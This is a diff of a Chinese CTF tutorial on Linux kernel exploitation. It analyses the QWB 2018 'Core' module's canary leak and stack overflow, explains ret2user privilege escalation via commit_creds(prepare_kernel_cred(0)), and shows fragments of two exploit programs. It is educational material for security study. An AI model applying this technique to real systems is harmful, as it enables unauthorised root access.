@@ -1,16 +1,23 @@
-#   krop
+# x. kernel
 
->   像用户态漏洞利用一样，kernel-pwn 的介绍也从 rop 开始
->
->   不同的是我们的目标不再是单纯的 getshell 了，而是提权，本文会以[强网杯-2018-Core](../attachments/chpf-0/give_to_pwner.tar.gz) 为例，介绍 kernel-pwn 中 ret2user 的提权技巧
+> 在一个低权限的 shell 中，通过利用内核的漏洞来拿到一个高权限的 shell，这是一种非常传统的 hack 思路 不觉得这很酷吗？这很符合我对于 hacking 的想象 。
 
-##  题目分析
+不过相对与前几节介绍的用户态程序的漏洞利用，kernel-pwn 的门槛也相对高一些，这主要体现在：
+
+- 对漏洞的利用更加复杂，内核存在更多保护
+- 调试起来更麻烦，gdb target remote 后调试会有明显的延迟，本地运行也会更加麻烦
+# 5.0 krop
+
+> 像用户态漏洞利用一样，kernel-pwn 的介绍也从 rop 开始
+> 
+> 不同的是我们的目标不再是单纯的 getshell 了，而是提权，本文会以[强网杯-2018-Core](https://www.notion.so/attachments/chpf-0/give_to_pwner.tar.gz) 为例，介绍 kernel-pwn 中 ret2user 的提权技巧
+## 5.0.0 题目分析
 
 对于大部分 kernel 题目，漏洞都出现在出题人编写的 LKM（Loadable kernel module）中，而 LKM 需要用 `insmod` 来加载到内核中，因此在 cpio 解包后就需要关注 init 文件来定位目标 LKM，然后拿到 ida 中进行分析。
 
 本题的 init 文件中有两行内容值得关注：
 
-```sh
+```bash
 cat /proc/kallsyms > /tmp/kallsyms
 insmod /core.ko
 ```
@@ -19,7 +26,7 @@ insmod /core.ko
 
 ida 打开 core.ko 后可以关注 `.data` 段下的 `core_fops`，这是一个 `file_operations` 结构体，定义如下：
 
-```c
+```cpp
 struct file_operations {
 	struct module *owner;
 	loff_t (*llseek) (struct file *, loff_t, int);
@@ -66,20 +73,20 @@ struct file_operations {
 
 与之对应的，如果某个函数指针域上不是 NULL，则在对 `int fd = open("/proc/core", 2);` 调用相关函数时，会转而调用表中对应的函数指针，如这里定义了 `write` 函数，则：
 
-```c
+```cpp
 int fd = open("/proc/core", 2);
 write(fd, buffer, size);
 ```
 
 这段代码就会调用到 `core_write` 函数上：
 
-```c
+```cpp
 signed __int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)
 {
-  printk("\x016core: called core_writen");
+  printk("\\x016core: called core_writen");
   if ( a3 <= 0x800 && !copy_from_user(name, a2, a3) )
     return (unsigned int)a3;
-  printk("\x016core: error copying data from userspacen", a2);
+  printk("\\x016core: error copying data from userspacen", a2);
   return 0xFFFFFFF2LL;
 }
 ```
@@ -88,7 +95,7 @@ signed __int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3
 
 再看到 `core_ioctl` 函数上，`ioctl` 函数是内核态与用户态交互的关键函数，里面定义了几种选项（可以理解为一种菜单）：
 
-```c
+```cpp
 __int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)
 {
   switch ( a2 )
@@ -97,21 +104,22 @@ __int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)
       core_read(a3);
       break;
     case 0x6677889C:
-      printk("\x016core: %d\n", a3);
+      printk("\\x016core: %d\\n", a3);
       off = a3;
       break;
     case 0x6677889A:
-      printk("\x016core: called core_copy\n");
+      printk("\\x016core: called core_copy\\n");
       core_copy_func(a3);
       break;
   }
   return 0LL;
 }
+
 ```
 
 依次查看这几个函数，发现 `core_read` 中复制内核栈上变量时的偏移量取决与第二个选项的全局变量 `off`：
 
-```c
+```cpp
 void __fastcall core_read(__int64 a1)
 {
   char *bufptr; // rdi
@@ -120,70 +128,74 @@ void __fastcall core_read(__int64 a1)
   unsigned __int64 v5; // [rsp+40h] [rbp-10h]
 
   v5 = __readgsqword(0x28u);
-  printk("\x016core: called core_read\n");
-  printk("\x016%d %p\n", off, (const void *)a1);
+  printk("\\x016core: called core_read\\n");
+  printk("\\x016%d %p\\n", off, (const void *)a1);
   bufptr = buf;
   for ( i = 16LL; i; --i )
   {
     *(_DWORD *)bufptr = 0;
     bufptr += 4;
   }
-  strcpy(buf, "Welcome to the QWB CTF challenge.\n");
+  strcpy(buf, "Welcome to the QWB CTF challenge.\\n");
   if ( copy_to_user(a1, &buf[off], 64LL) )
     __asm { swapgs }
 }
+
 ```
 
 `checksec core.ko` 发现内核栈中一样是有 `canary` 保护的，而上面这个 `core_read` 函数就可以用来泄露得到 `canary`。
 
 最后再观察 `core_copy_func`，发现存在负数溢出导致的栈溢出：
 
-```c
+```cpp
 void __fastcall core_copy_func(signed __int64 a1)
 {
   char v1[64]; // [rsp+0h] [rbp-50h] BYREF
   unsigned __int64 v2; // [rsp+40h] [rbp-10h]
 
   v2 = __readgsqword(0x28u);
-  printk("\x016core: called core_writen");
+  printk("\\x016core: called core_writen");
   if ( a1 > 0x3F )
-    printk("\x016Detect Overflow");
+    printk("\\x016Detect Overflow");
   else
     qmemcpy(v1, name, (unsigned __int16)a1);    // overflow
 }
+
 ```
 
 于是我们可以通过编写 c 程序调用 `core.ko`，实现劫持内核函数的控制流，思路明确如下：
 
--   1. 通过查找 `/tmp/kallsyms` 获得内核函数地址与 `kaslr` 偏移
--   2. `ioctl` 获得 `canary`
--   3. `write` 往内核变量 `name` 中写入 `ROP` 链
--   4. 通过 `core_copy_func` 的栈溢出劫持内核控制流
+- 通过查找 `/tmp/kallsyms` 获得内核函数地址与 `kaslr` 偏移
+- `ioctl` 获得 `canary`
+- `write` 往内核变量 `name` 中写入 `ROP` 链
+- 通过 `core_copy_func` 的栈溢出劫持内核控制流
 
 ---
 
-##  漏洞利用
+## 5.0.1 漏洞利用
 
 上面只是对存在漏洞的 LKM 进行了分析，接下来看具体该怎么利用，即探讨 `kernel-ROP-ret2user` 的具体实现：
 
->   内核会通过进程的 `task_struct` 结构体中的 `cred` 指针来索引 `cred` 结构体，然后根据 `cred` 的内容来判断一个进程拥有的权限，如果 `cred` 结构体成员中的 `uid-fsgid` 都为 0，那一般就会认为进程具有 `root` 权限。
+> 内核会通过进程的 task_struct 结构体中的 cred 指针来索引 cred 结构体，然后根据 cred 的内容来判断一个进程拥有的权限，如果 cred 结构体成员中的 uid-fsgid 都为 0，那一般就会认为进程具有 root 权限。
+> 
 
 一种常见的提权方式就是执行 `commit_creds(prepare_kernel_cred(0))`，方式会自动生成一个合法的 `cred`，并定位当前线程的 `task_struct` 的位置，然后修改它的 `cred` 为新的 `cred`。该方式比较适用于控制程序执行流后使用。
 
 通过获取 `kaslr` 偏移地址，就可以得到上面两个内核函数和 `rop gadgets` 的地址，但是在内核态返回用户态的时候，还需要额外执行 `swapgs; iretq` 来恢复用户态的现场，即 `iretq` 后跟：
 
-```c
+```cpp
 iretq_ret;
 (size_t)RET_ADDR;
 user_cs;
 user_rflags;
 user_sp;
 user_ss;
+
 ```
 
 同时，程序最开始的地方也要保存用户态的现场：
 
-```c
+```cpp
 size_t user_cs, user_ss, user_rflags, user_sp;
 void save_status() {
     __asm__("mov user_cs, cs;"
@@ -194,6 +206,7 @@ void save_status() {
     );
     puts("[*]status has been saved.");
 }
+
 ```
 
 ## 最终 exp.c
@@ -210,7 +223,7 @@ void save_status() {
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <sys/ioctl.h>
-#define lg(X) printf("\033[1;31;40m[*] %s --> 0x%lx \033[0m\n", (#X), (X))
+#define lg(X) printf("\\033[1;31;40m[*] %s --> 0x%lx \\033[0m\\n", (#X), (X))
 
 size_t user_cs, user_ss, user_rflags, user_sp;
 void save_status() {
@@ -296,9 +309,11 @@ int main() {
 
     return 0;
 }
+
 ```
 
->   上面的 ROP 链中，使用了函数指针的方法来执行 `commit_creds(prepare_kernel_cred(0))`，虽然这是在用户函数中去调用内核函数，但是我们还在 ROP 的过程中，还是 ring0 的特权，当然也可以通过直接 ROP 的方法来调用两个函数：
+> 上面的 ROP 链中，使用了函数指针的方法来执行 commit_creds(prepare_kernel_cred(0))，虽然这是在用户函数中去调用内核函数，但是我们还在 ROP 的过程中，还是 ring0 的特权，当然也可以通过直接 ROP 的方法来调用两个函数：
+> 
 
 ```c
 // author: @eastXueLian
@@ -312,7 +327,7 @@ int main() {
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <sys/ioctl.h>
-#define lg(X) printf("\033[1;31;40m[*] %s --> 0x%lx \033[0m\n", (#X), (X))
+#define lg(X) printf("\\033[1;31;40m[*] %s --> 0x%lx \\033[0m\\n", (#X), (X))
 
 size_t user_cs, user_ss, user_rflags, user_sp;
 void save_status() {
@@ -406,8 +421,7 @@ int main() {
 
     return 0;
 }
+
 ```
 
->   主要区别在于 ROP 链的布置，可以注意到 `mov rdi, rax; jmp rdx;` 的 `magic_gadgets` 的使用。
-
----
+> 主要区别在于 ROP 链的布置，可以注意到 mov rdi, rax; jmp rdx; 的 magic_gadgets 的使用。
